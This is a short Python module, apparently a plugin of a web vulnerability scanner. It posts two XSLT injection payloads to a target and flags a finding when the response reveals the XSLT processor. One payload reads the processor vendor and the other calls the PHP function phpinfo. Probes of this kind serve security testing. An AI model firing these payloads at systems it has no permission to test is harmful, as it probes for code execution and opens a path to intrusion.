"""xslt_injection — XSLT processor injection probe"""
from core.http import HttpClient

PAYLOADS = [
    '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property(\'xsl:vendor\')"/></xsl:template></xsl:stylesheet>',
    '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'phpinfo\')"/></xsl:template></xsl:stylesheet>',
]

class XsltInjection:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        findings = []
        for p in PAYLOADS:
            r = http.post(session.target, data=p, headers={"Content-Type":"application/xml"})
            if not r: continue
            if "libxslt" in r.text.lower() or "xslt" in r.text.lower() or "phpinfo" in r.text.lower():
                findings.append({"payload":p[:60],"code":r.status_code})
                print(f"  [!] XSLT processor responds")
                logger.finding("xslt","high","processor reflected")
        print(f"[xslt_injection] {len(findings)}")
        return {"findings": findings}
